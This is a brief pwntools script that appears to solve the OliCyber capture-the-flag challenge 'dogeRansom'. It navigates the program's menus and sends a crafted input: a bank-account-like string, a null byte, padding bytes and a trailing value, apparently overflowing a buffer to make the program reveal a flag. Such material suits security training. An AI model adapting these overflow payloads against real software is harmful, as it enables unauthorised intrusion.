from pwn import *

if args.REMOTE:
    r = remote('dogeransom.challs.olicyber.it', 10804)
else:
    r = gdb.debug("./dogeRansom", '''b main''')

r.recvuntil(b"> ")
r.sendline(b"1")

r.recvuntil(b": ")
r.sendline(b"1")

r.recvuntil(b": ")
r.sendline(b"IT70S0501811800000012284030\x00"+b"\x7F"*21 + b"\x03")
r.recvuntil(b"Pls invia il nostro ransomware ad altre 10 persone pls\n")
print(r.recvline().decode()[:-1])
r.close()